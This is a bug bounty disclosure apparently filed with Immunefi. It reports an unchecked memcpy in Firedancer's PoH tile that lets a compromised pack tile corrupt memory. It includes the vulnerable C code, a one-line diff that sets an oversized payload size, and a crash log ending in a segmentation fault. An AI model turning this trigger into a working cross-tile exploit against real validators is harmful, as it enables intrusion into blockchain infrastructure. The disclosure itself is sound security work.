# Boost \_ Firedancer v0.1 33717 - \[Blockchain\_DLT - Medium] Memory corruption caused by fully controll

Submitted on Sat Jul 27 2024 08:48:17 GMT-0400 (Atlantic Standard Time) by @c4a4dda89 for [Boost | Firedancer v0.1](https://immunefi.com/bounty/firedancer-boost/)

Report ID: #33717

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/firedancer-io/firedancer/tree/e60d9a6206efaceac65a5a2c3a9e387a79d1d096>

Impacts:

* Process to process RCE between sandboxed tiles

## Description

## Brief/Intro

The `fd_mux_during_frag_fn` is called after the mux has received a new frag.

```c
/* fd_mux_during_frag_fn is called after the mux has received a new frag
   from an in, but before the mux has checked that it was overrun.  This
   callback is not invoked if the mux is backpressured, as it would not
   try and read a frag from an in in the first place (instead, leaving
   it on the in mcache to backpressure the upstream producer).  in_idx
   will be the index of the in that the frag was received from.

   If the producer of the frags is respecting flow control, it is safe
   to read frag data in any of the callbacks, but it is suggested to
   copy or read frag data within this callback, as if the producer does
   not respect flow control, the frag may be torn or corrupt due to an
   overrun by the reader.  If the frag being read from has been
   overwritten while this callback is running, the frag will be ignored
   and the mux will not call the process function.  Instead it will
   recover from the overrun and continue with new frags.

   This function cannot fail.  If opt_filter is set to non-zero, it
   means the frag should be filtered and not passed on to downstream
   consumers of the mux.

   The ctx is a user-provided context object from when the mux tile was
   initialized.

   seq, sig, chunk, and sz are the respective fields from the mcache
   fragment that was received.  If the producer is not respecting flow
   control, these may be corrupt or torn and should not be trusted,
   except for seq which is read atomically. */

typedef void (fd_mux_during_frag_fn)( void * ctx,
                                      ulong  in_idx,
                                      ulong  seq,
                                      ulong  sig,
                                      ulong  chunk,
                                      ulong  sz,
                                      int *  opt_filter );
```

Specifically, the parameters `seq`, `sig`, `chunk`, and `sz` originate from the received mcache fragment. Since the producer could be compromised, these fields are considered untrusted.

## Vulnerability Details

In the file `fd_poh.c` located at `src/app/fdctl/run/tiles`, when the `during_frag` process receives data from fd\_pack, at the code point \[1], the data is directly copied `to ctx->_txns` without any checks.

```c

static inline void
during_frag( void * _ctx,
             ulong  in_idx,
             ulong  seq,
             ulong  sig,
             ulong  chunk,
             ulong  sz,
             int *  opt_filter ) {
  (void)seq;
  (void)sig;
  (void)opt_filter;

  	//...
	// fd_poh.c:1393 
	if( FD_UNLIKELY( chunk<ctx->bank_in[ in_idx ].chunk0 || chunk>ctx->bank_in[ in_idx ].wmark || sz>USHORT_MAX ) )
	      FD_LOG_ERR(( "chunk %lu %lu corrupt, not in range [%lu,%lu]", chunk, sz, ctx->bank_in[ in_idx ].chunk0, ctx->bank_in[ in_idx ].wmark ));

	    uchar * src = (uchar *)fd_chunk_to_laddr( ctx->bank_in[ in_idx ].mem, chunk );

	    fd_memcpy( ctx->_txns, src, sz-sizeof(fd_microblock_trailer_t) );		// [1]
	    fd_memcpy( ctx->_microblock_trailer, src+sz-sizeof(fd_microblock_trailer_t), sizeof(fd_microblock_trailer_t) );

	    FD_TEST( ctx->_microblock_trailer->bank_idx<ctx->bank_cnt );

	    /* Indicate to pack tile we are done processing the transactions so
	       it can pack new microblocks using these accounts.  This has to be
	       done before filtering the frag, otherwise we would not notify
	       pack that accounts are unlocked in certain cases.

	       TODO: This is way too late to do this.  Ideally we would release
	       the accounts right after we execute and commit the results to the
	       accounts database.  It has to happen before because otherwise
	       there's a race where the bank releases the accounts, they get
	       reuused in another bank, and that bank sends to PoH and gets its
	       microblock pulled first -- so the bank commit and poh mixin order
	       is not the same.  Ideally we would resolve this a bit more
	       cleverly and without holding the account locks this much longer. */
	    fd_fseq_update( ctx->bank_busy[ ctx->_microblock_trailer->bank_idx ], ctx->_microblock_trailer->bank_busy_seq );

	    *opt_filter = is_frag_for_prior_leader_slot;
	//fd_poh.c:1418
	//...
}
```

And in the subsequent call to the `after_frag` process, the `ctx->_txns` in this segment is used by the publish\_microblock function. However, when the publish\_microblock function uses the data in `ctx->_txns` as parameters for `fd_memcpy` , at the code point \[2], there are no checks, leading to arbitrary control over the memory source and size, which in turn causes memory corruption issues. There is even a risk of code execution.

```c
static void
publish_microblock( fd_poh_ctx_t *     ctx,
                    fd_mux_context_t * mux,
                    ulong              sig,
                    ulong              slot,
                    ulong              hashcnt_delta,
                    ulong              txn_cnt ) {
  uchar * dst = (uchar *)fd_chunk_to_laddr( ctx->shred_out_mem, ctx->shred_out_chunk );
  FD_TEST( slot>=ctx->reset_slot );
  fd_entry_batch_meta_t * meta = (fd_entry_batch_meta_t *)dst;
  meta->parent_offset = 1UL+slot-ctx->reset_slot;
  meta->reference_tick = (ctx->hashcnt/ctx->hashcnt_per_tick) % ctx->ticks_per_slot;
  meta->block_complete = !ctx->hashcnt;

  dst += sizeof(fd_entry_batch_meta_t);
  fd_entry_batch_header_t * header = (fd_entry_batch_header_t *)dst;
  header->hashcnt_delta = hashcnt_delta;
  fd_memcpy( header->hash, ctx->hash, 32UL );

  dst += sizeof(fd_entry_batch_header_t);
  ulong payload_sz = 0UL;
  ulong included_txn_cnt = 0UL;
  for( ulong i=0UL; i<txn_cnt; i++ ) {
    fd_txn_p_t * txn = (fd_txn_p_t *)(ctx->_txns + i*sizeof(fd_txn_p_t));
    if( FD_UNLIKELY( !(txn->flags & FD_TXN_P_FLAGS_EXECUTE_SUCCESS) ) ) continue;

    fd_memcpy( dst, txn->payload, txn->payload_sz ); //[2] <==== txn->payload and txn->payload_sz is arbitrary controlled. crash here.
    payload_sz += txn->payload_sz;
    dst        += txn->payload_sz;
    included_txn_cnt++;
  }
  header->txn_cnt = included_txn_cnt;

  /* We always have credits to publish here, because we have a burst
     value of 3 credits, and at most we will publish_tick() once and
     then publish_became_leader() once, leaving one credit here to
     publish the microblock. */
  ulong tspub = (ulong)fd_frag_meta_ts_comp( fd_tickcount() );
  ulong sz = sizeof(fd_entry_batch_meta_t)+sizeof(fd_entry_batch_header_t)+payload_sz;
  fd_mux_publish( mux, sig, ctx->shred_out_chunk, sz, 0UL, 0UL, tspub );
  ctx->shred_out_chunk = fd_dcache_compact_next( ctx->shred_out_chunk, sz, ctx->shred_out_chunk0, ctx->shred_out_wmark );
}
```

## Impact Details

Process-to-process memory corruption may lead to the process-to-process RCE between sandboxed tiles.

## References

1. <https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_poh.c#L1398>
2. <https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_poh.c#L1575>
3. <https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_poh.c#L1448>

## Proof of concept

The attack surface of this vulnerability is when an attacker has arbitrary code execution rights over `fd_pack`, and then launches a process to process RCE attack on `fd_poh`. Therefore, we modify the relevant code of the `fd_pack` process to simulate the situation where the attacker has already obtained the ability to execute code.

The project side realized that the modified content shown by the git diff needs to be synchronized to the local environment. By executing `make -j fddev` and `sudo fddev --no-sandbox`, a crash can be triggered.

## Proof of Concept

```c
diff --git a/src/ballet/pack/fd_pack.c b/src/ballet/pack/fd_pack.c
index f346ac15..e5a243ef 100644
--- a/src/ballet/pack/fd_pack.c
+++ b/src/ballet/pack/fd_pack.c
@@ -979,6 +979,7 @@ fd_pack_schedule_impl( fd_pack_t  * pack,
     fd_memcpy( out->payload, cur->txn->payload, cur->txn->payload_sz                                           );
     fd_memcpy( TXN(out),     txn,               fd_txn_footprint( txn->instr_cnt, txn->addr_table_lookup_cnt ) );
     out->payload_sz = cur->txn->payload_sz;
+    out->payload_sz = 0x41414141;
     out->meta       = cur->txn->meta;
     out->flags      = cur->txn->flags;
     out++;
```

After making the following modifications to the code, executing `make -j fddev` and then running `sudo fddev --no-sandbox` will trigger a crash.

```shell
➜  firedancer git:(test_shred) ✗ sudo ./build/native/gcc/bin/fddev --no-sandbox
Log at "/tmp/fd-0.0.0_691256_user_iZj6cb4rx1iaaia4lsmixxZ_2024_07_27_13_36_15_318898975_GMT+08"
NOTICE  07-27 13:36:15.322362 691256 f0   main src/app/fdctl/configure/configure.c(106): kill ... configuring
NOTICE  07-27 13:36:15.350036 691256 f0   main src/app/fdctl/configure/configure.c(81): netns ... skipping .. not enabled
NOTICE  07-27 13:36:15.350135 691256 f0   main src/app/fdctl/configure/configure.c(102): hugetlbfs ... already valid
NOTICE  07-27 13:36:15.350199 691256 f0   main src/app/fdctl/configure/configure.c(102): sysctl ... already valid
NOTICE  07-27 13:36:15.350236 691256 f0   main src/app/fdctl/configure/configure.c(102): ethtool ... already valid
NOTICE  07-27 13:36:15.350253 691256 f0   main src/app/fdctl/configure/configure.c(102): keys ... already valid
NOTICE  07-27 13:36:15.350266 691256 f0   main src/app/fdctl/configure/configure.c(92): genesis ... undoing ... `/home/user/.firedancer/fd1/ledger/genesis.bin` already exists
NOTICE  07-27 13:36:15.350360 691256 f0   main src/app/fdctl/configure/configure.c(106): genesis ... configuring
NOTICE  07-27 13:36:15.372244 691256 f0   main src/app/fdctl/configure/configure.c(92): blockstore ... undoing ... rocksdb directory exists at `/home/user/.firedancer/fd1/ledger`
NOTICE  07-27 13:36:15.372961 691256 f0   main src/app/fdctl/configure/configure.c(106): blockstore ... configuring
NOTICE  07-27 13:36:15.630038 691256 f0   main src/disco/topo/fd_topo.c(445):
SUMMARY
              Total Tiles: 16
      Total Memory Locked: 28145897472 bytes (26 GiB + 218 MiB + 20 KiB)
  Required Gigantic Pages: 26
      Required Huge Pages: 109
    Required Normal Pages: 36
  Required Gigantic Pages (NUMA node 0): 26
      Required Huge Pages (NUMA node 0): 109

WORKSPACES
   0 (  1 GiB):     net_quic  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=68173824    loose=1005563904
   1 (  1 GiB):    net_shred  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=68173824    loose=1005563904
   2 (  1 GiB):  quic_verify  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=43589632    loose=1030148096
   3 (  1 GiB): verify_dedup  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=180908032   loose=892829696
   4 (  1 GiB):   dedup_pack  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=578826240   loose=494911488
   5 (  5 GiB):    pack_bank  page_cnt=5  page_sz=gigantic  numa_idx=0   footprint=4297203712  loose=1071501312
   6 (  1 GiB):     bank_poh  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=17076224    loose=1056661504
   7 (  2 MiB):    bank_busy  page_cnt=1  page_sz=huge      numa_idx=0   footprint=8192        loose=2084864
   8 (  2 GiB):    poh_shred  page_cnt=2  page_sz=gigantic  numa_idx=0   footprint=1273008128  loose=874471424
   9 (  6 MiB):  gossip_pack  page_cnt=3  page_sz=huge      numa_idx=0   footprint=4534272     loose=1753088
  10 (  3 GiB):  shred_store  page_cnt=3  page_sz=gigantic  numa_idx=0   footprint=2825838592  loose=395382784
  11 (  1 GiB):    stake_out  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=209059840   loose=864677888
  12 (  2 MiB):    metric_in  page_cnt=1  page_sz=huge      numa_idx=0   footprint=53248       loose=2039808
  13 (  2 MiB):    quic_sign  page_cnt=1  page_sz=huge      numa_idx=0   footprint=45056       loose=2048000
  14 (  2 MiB):    sign_quic  page_cnt=1  page_sz=huge      numa_idx=0   footprint=28672       loose=2064384
  15 (  2 MiB):   shred_sign  page_cnt=1  page_sz=huge      numa_idx=0   footprint=28672       loose=2064384
  16 (  2 MiB):   sign_shred  page_cnt=1  page_sz=huge      numa_idx=0   footprint=28672       loose=2064384
  17 (  1 GiB):          net  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=67244032    loose=1006493696
  18 (  1 GiB):         quic  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=254480384   loose=819257344
  19 (  2 MiB):       verify  page_cnt=1  page_sz=huge      numa_idx=0   footprint=28672       loose=2064384
  20 (  1 GiB):        dedup  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=100671488   loose=973066240
  21 (  1 GiB):         pack  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=366161920   loose=707575808
  22 (  2 MiB):         bank  page_cnt=1  page_sz=huge      numa_idx=0   footprint=69632       loose=2023424
  23 (  1 GiB):          poh  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=45252608    loose=1028485120
  24 (  1 GiB):        shred  page_cnt=1  page_sz=gigantic  numa_idx=0   footprint=114769920   loose=958967808
  25 (  2 MiB):        store  page_cnt=1  page_sz=huge      numa_idx=0   footprint=49152       loose=2043904
  26 (  2 MiB):         sign  page_cnt=1  page_sz=huge      numa_idx=0   footprint=8192        loose=2084864
  27 (  3 GiB):       metric  page_cnt=3  page_sz=gigantic  numa_idx=0   footprint=2147627008  loose=1073594368

LINKS
   0 ( 32 MiB):     net_quic  kind_id=0   wksp_id=0   depth=16384  mtu=2048       burst=1
   1 ( 32 MiB):    net_shred  kind_id=0   wksp_id=1   depth=16384  mtu=2048       burst=1
   2 ( 32 MiB):     quic_net  kind_id=0   wksp_id=0   depth=16384  mtu=2048       burst=1
   3 ( 32 MiB):    shred_net  kind_id=0   wksp_id=1   depth=16384  mtu=2048       burst=1
   4 ( 41 MiB):  quic_verify  kind_id=0   wksp_id=0   depth=16384  mtu=0          burst=16384
   5 ( 34 MiB): verify_dedup  kind_id=0   wksp_id=3   depth=16384  mtu=2086       burst=1
   6 ( 34 MiB): verify_dedup  kind_id=1   wksp_id=3   depth=16384  mtu=2086       burst=1
   7 ( 34 MiB): verify_dedup  kind_id=2   wksp_id=3   depth=16384  mtu=2086       burst=1
   8 ( 34 MiB): verify_dedup  kind_id=3   wksp_id=3   depth=16384  mtu=2086       burst=1
   9 ( 34 MiB): verify_dedup  kind_id=4   wksp_id=3   depth=16384  mtu=2086       burst=1
  10 (544 MiB):   dedup_pack  kind_id=0   wksp_id=4   depth=262144  mtu=2086       burst=1
  11 (  4 MiB):  gossip_pack  kind_id=0   wksp_id=9   depth=2048   mtu=2086       burst=1
  12 (199 MiB):    stake_out  kind_id=0   wksp_id=11  depth=128    mtu=1608032    burst=1
  13 (  4 GiB):    pack_bank  kind_id=0   wksp_id=5   depth=65536  mtu=65535      burst=1
  14 (  8 MiB):     bank_poh  kind_id=0   wksp_id=6   depth=128    mtu=65535      burst=1
  15 (  8 MiB):     bank_poh  kind_id=1   wksp_id=6   depth=128    mtu=65535      burst=1
  16 (  0 MiB):     poh_pack  kind_id=0   wksp_id=6   depth=128    mtu=48         burst=1
  17 (  1 GiB):    poh_shred  kind_id=0   wksp_id=8   depth=16384  mtu=65535      burst=1
  18 (189 MiB):   crds_shred  kind_id=0   wksp_id=8   depth=128    mtu=1527608    burst=1
  19 (  2 GiB):  shred_store  kind_id=0   wksp_id=10  depth=16384  mtu=167168     burst=516
  20 (  0 MiB):    quic_sign  kind_id=0   wksp_id=13  depth=128    mtu=130        burst=1
  21 (  0 MiB):    sign_quic  kind_id=0   wksp_id=14  depth=128    mtu=64         burst=1
  22 (  0 MiB):   shred_sign  kind_id=0   wksp_id=15  depth=128    mtu=32         burst=1
  23 (  0 MiB):   sign_shred  kind_id=0   wksp_id=16  depth=128    mtu=64         burst=1

TILES
   0 (  3 GiB):          net  kind_id=0   wksp_id=17  cpu_idx=1   out_link=-1  in=[-2, -3]  out=[ 0,  1]
   1 (  3 GiB):         quic  kind_id=0   wksp_id=18  cpu_idx=2   out_link=4   in=[ 0, -21]  out=[ 2, 20]
   2 (  2 GiB):       verify  kind_id=0   wksp_id=19  cpu_idx=3   out_link=5   in=[-4]  out=[]
   3 (  2 GiB):       verify  kind_id=1   wksp_id=19  cpu_idx=4   out_link=6   in=[-4]  out=[]
   4 (  2 GiB):       verify  kind_id=2   wksp_id=19  cpu_idx=5   out_link=7   in=[-4]  out=[]
   5 (  2 GiB):       verify  kind_id=3   wksp_id=19  cpu_idx=6   out_link=8   in=[-4]  out=[]
   6 (  2 GiB):       verify  kind_id=4   wksp_id=19  cpu_idx=7   out_link=9   in=[-4]  out=[]
   7 (  3 GiB):        dedup  kind_id=0   wksp_id=20  cpu_idx=8   out_link=10  in=[ 5,  6,  7,  8,  9]  out=[]
   8 (  8 GiB):         pack  kind_id=0   wksp_id=21  cpu_idx=9   out_link=13  in=[10, 11, -16]  out=[]
   9 (  6 GiB):         bank  kind_id=0   wksp_id=22  cpu_idx=10  out_link=14  in=[13]  out=[]
  10 (  6 GiB):         bank  kind_id=1   wksp_id=22  cpu_idx=11  out_link=15  in=[13]  out=[]
  11 ( 10 GiB):          poh  kind_id=0   wksp_id=23  cpu_idx=12  out_link=17  in=[14, 15, 12, 13]  out=[16, 11, 12, 18]
  12 (  8 GiB):        shred  kind_id=0   wksp_id=24  cpu_idx=13  out_link=19  in=[-1, 17, 12, 18, -23]  out=[ 3, 22]
  13 (  3 GiB):        store  kind_id=0   wksp_id=25  cpu_idx=14  out_link=-1  in=[19]  out=[]
  14 ( 24 MiB):         sign  kind_id=0   wksp_id=26  cpu_idx=15  out_link=-1  in=[-20, -22]  out=[21, 23]
  15 (  3 GiB):       metric  kind_id=0   wksp_id=27  cpu_idx=16  out_link=-1  in=[]  out=[]
NOTICE  07-27 13:36:15.706248 691332 1    net:0 src/disco/topo/fd_topo_run.c(30): booting tile net:0 pid:691319 tid:691332
NOTICE  07-27 13:36:15.708490 691331 10   bank:0 src/disco/topo/fd_topo_run.c(30): booting tile bank:0 pid:691318 tid:691333
NOTICE  07-27 13:36:15.713778 691334 13   shred:0 src/disco/topo/fd_topo_run.c(30): booting tile shred:0 pid:691328 tid:691334
NOTICE  07-27 13:36:15.714347 691335 2    quic:0 src/disco/topo/fd_topo_run.c(30): booting tile quic:0 pid:691320 tid:691335
NOTICE  07-27 13:36:15.714363 691337 15   sign:0 src/disco/topo/fd_topo_run.c(30): booting tile sign:0 pid:691329 tid:691337
NOTICE  07-27 13:36:15.714590 691339 16   metric:0 src/disco/topo/fd_topo_run.c(30): booting tile metric:0 pid:691330 tid:691339
NOTICE  07-27 13:36:15.714623 691338 3    verify:0 src/disco/topo/fd_topo_run.c(30): booting tile verify:0 pid:691321 tid:691338
NOTICE  07-27 13:36:15.714791 691339 16   metric:0 src/app/fdctl/run/tiles/fd_metric.c(471): Prometheus metrics endpoint listening on port 7999
NOTICE  07-27 13:36:15.715466 691341 4    verify:1 src/disco/topo/fd_topo_run.c(30): booting tile verify:1 pid:691322 tid:691341
NOTICE  07-27 13:36:15.715468 691340 5    verify:2 src/disco/topo/fd_topo_run.c(30): booting tile verify:2 pid:691323 tid:691340
NOTICE  07-27 13:36:15.716481 691331 11   bank:1 src/disco/topo/fd_topo_run.c(30): booting tile bank:1 pid:691318 tid:691336
NOTICE  07-27 13:36:15.718486 691342 6    verify:3 src/disco/topo/fd_topo_run.c(30): booting tile verify:3 pid:691324 tid:691342
NOTICE  07-27 13:36:15.719813 691343 7    verify:4 src/disco/topo/fd_topo_run.c(30): booting tile verify:4 pid:691325 tid:691343
NOTICE  07-27 13:36:15.720479 691344 8    dedup:0 src/disco/topo/fd_topo_run.c(30): booting tile dedup:0 pid:691326 tid:691344
NOTICE  07-27 13:36:15.724014 691346 9    pack:0 src/disco/topo/fd_topo_run.c(30): booting tile pack:0 pid:691327 tid:691346
NOTICE  07-27 13:36:15.724486 691331 12   poh:0 src/disco/topo/fd_topo_run.c(30): booting tile poh:0 pid:691318 tid:691345
NOTICE  07-27 13:36:15.724629 691331 12   poh:0 src/app/fdctl/run/tiles/fd_poh.c(1772): PoH waiting to be initialized by Solana Labs client... 0 0
NOTICE  07-27 13:36:15.732507 691331 14   store:0 src/disco/topo/fd_topo_run.c(30): booting tile store:0 pid:691318 tid:691347
NOTICE  07-27 13:36:15.732592 691331 14   store:0 src/app/fdctl/run/tiles/fd_store.c(137): Waiting to acquire blockstore...
NOTICE  07-27 13:36:15.736529 691331 f0   solana-labs src/app/fdctl/run/run_solana.c(204): booting solana pid:691318
WARNING 07-27 13:36:15.738645 691331 f0   solana-labs perf/src/lib.rs(50): CUDA is disabled
WARNING 07-27 13:36:15.742619 691348 f17  0    metrics/src/metrics.rs(283): datapoint: os-config vm.max_map_count=1048576i
WARNING 07-27 13:36:15.744842 691348 f17  0    metrics/src/metrics.rs(283): datapoint: os-config net.core.optmem_max=131072i
WARNING 07-27 13:36:15.746604 691348 f17  0    metrics/src/metrics.rs(283): datapoint: os-config net.core.netdev_max_backlog=1000i
WARNING 07-27 13:36:15.762676 691331 f0   solana-labs perf/src/perf_libs.rs(107): "/home/user/firedancer/build/native/gcc/bin/perf-libs" does not exist
WARNING 07-27 13:36:15.764961 691331 f0   solana-labs core/src/validator.rs(540): authorized voter: 4eZYedyLaeopux9DWPsNA2a4YjfJGAZbNNC328qVErY3
NOTICE  07-27 13:36:15.865372 691331 14   store:0 src/app/fdctl/run/tiles/fd_store.c(143): Got blockstore
WARNING 07-27 13:36:15.865673 691331 f0   solana-labs ledger/src/bank_forks_utils.rs(152): No snapshot package found in directory: /home/user/.firedancer/fd1/ledger; will load from genesis
ERR     07-27 13:36:17.673646 691256 f0   pidns src/app/fdctl/run/run.c(365): tile solana-labs:0 exited with signal 11 (SIGSEGV-Segmentation fault)
```
